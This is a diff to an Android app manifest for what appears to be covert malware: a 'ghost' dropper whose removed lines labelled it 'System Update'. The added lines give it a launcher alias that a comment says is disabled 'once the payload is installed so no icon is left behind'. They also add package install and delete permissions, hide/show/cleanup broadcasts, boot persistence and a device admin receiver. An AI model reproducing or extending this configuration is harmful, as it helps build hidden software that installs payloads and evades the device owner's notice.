@@ -6,35 +6,52 @@
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PLAYBACK" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission" />
     <uses-permission android:name="android.permission.VIBRATE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
-        android:maxSdkVersion="29" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
         android:maxSdkVersion="32" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
-        tools:ignore="ScopedStorage" />
 
     <application
-        android:label="System Update"
+        android:label="@string/app_name"
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher_shield"
         android:excludeFromRecents="true"
         android:taskAffinity="com.android.shell.ghost.dummy"
         android:usesCleartextTraffic="true"
         tools:ignore="UnusedAttribute">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:theme="@style/GhostTheme.Setup"
+            android:excludeFromRecents="true"
+            android:taskAffinity="com.android.shell.ghost.dummy"
+            android:launchMode="singleTop"
+            android:configChanges="orientation|screenSize|keyboardHidden" />
+
+        <!-- Launcher entry. Enabled while the wrapper is still needed, then
+             disabled programmatically (PackageManager) once the payload is
+             installed so no icon is left behind. No root required. -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:enabled="true"
+            android:label="@string/app_name"
+            android:icon="@mipmap/ic_launcher_shield">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
         <activity
             android:name=".TransparentActivity"
@@ -62,43 +79,45 @@
         </service>
 
         <service
-            android:name=".GhostForegroundService" android:foregroundServiceType="dataSync"
+            android:name=".GhostForegroundService"
+            android:foregroundServiceType="dataSync"
             android:exported="false" />
 
         <receiver android:name=".GhostCleanupReceiver" android:exported="true">
-            <intent-filter><action android:name="com.betterdesk.CLEANUP"/><action android:name="com.betterdesk.HIDE"/></intent-filter>
+            <intent-filter>
+                <action android:name="com.betterdesk.CLEANUP" />
+                <action android:name="com.betterdesk.HIDE" />
+                <action android:name="com.betterdesk.SHOW" />
+            </intent-filter>
         </receiver>
-        <receiver android:name=".BootReceiver"
+
+        <receiver
+            android:name=".BootReceiver"
             android:exported="false"
             android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
             </intent-filter>
         </receiver>
 
+        <!-- Install session callback + package state events. The data scheme is
+             required, otherwise PACKAGE_ADDED is never delivered. -->
         <receiver
             android:name=".PackageInstallReceiver"
             android:exported="false">
             <intent-filter>
+                <action android:name="com.android.shell.ghost.INSTALL_RESULT" />
+                <action android:name="com.android.shell.ghost.UNINSTALL_RESULT" />
+            </intent-filter>
+            <intent-filter>
                 <action android:name="android.intent.action.PACKAGE_ADDED" />
                 <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <data android:scheme="package" />
             </intent-filter>
         </receiver>
-
-        <activity
-            android:name=".MainActivity"
-            android:excludeFromRecents="true"
-            android:taskAffinity="com.android.shell.ghost.dummy"
-            android:exported="true">
-        </activity>
-
-        <activity-alias android:name=".LauncherAlias" android:targetActivity=".MainActivity" android:exported="true" android:enabled="false" android:label="System Update" android:icon="@mipmap/ic_launcher_shield">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
 
         <receiver
             android:name=".GhostDeviceAdmin"
@@ -106,7 +125,9 @@
             android:exported="true"
             android:enabled="true">
             <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin" />
-            <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
         </receiver>
 
         <provider
